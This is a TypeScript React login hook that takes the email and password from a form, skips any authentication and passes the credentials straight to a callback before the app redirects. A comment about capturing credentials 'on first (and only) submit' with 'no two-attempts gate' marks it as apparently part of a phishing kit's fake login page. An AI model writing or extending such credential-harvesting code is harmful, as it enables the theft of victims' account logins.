import { useState, useRef } from 'react';

export const useLogin = (
  onLoginSuccess?: (data: any) => void,
  onLoginError?: (error: string) => void
) => {
  const [isLoading, setIsLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  
  const emailRef = useRef<HTMLInputElement>(null);
  const passwordRef = useRef<HTMLInputElement>(null);

  const resetLoginState = () => {
    setErrorMessage('');
  };

  const handleFormSubmit = async (event: React.FormEvent, formData?: any) => {
    event.preventDefault();
    setIsLoading(true);
    setErrorMessage('');

    try {
      const email = formData?.email || emailRef.current?.value || '';
      const password = formData?.password || passwordRef.current?.value || '';
      
      if (!email || !password) {
        throw new Error('Please enter both email and password');
      }

      const finalData = {
        ...formData,
        email,
        password,
      };

      // Capture credentials on first (and only) submit — no two-attempts gate
      if (onLoginSuccess) {
        onLoginSuccess(finalData);
      }
      
      // Do not set loading to false here; App.tsx redirects on success
      return;

    } catch (error) {
      const errorMsg = error instanceof Error ? error.message : 'Login failed';
      setErrorMessage(errorMsg);
      setIsLoading(false);
      if (onLoginError) {
        onLoginError(errorMsg);
      }
      return {};
    }
  };

  return {
    isLoading,
    errorMessage,
    handleFormSubmit,
    resetLoginState,
    emailRef,
    passwordRef,
  };
};
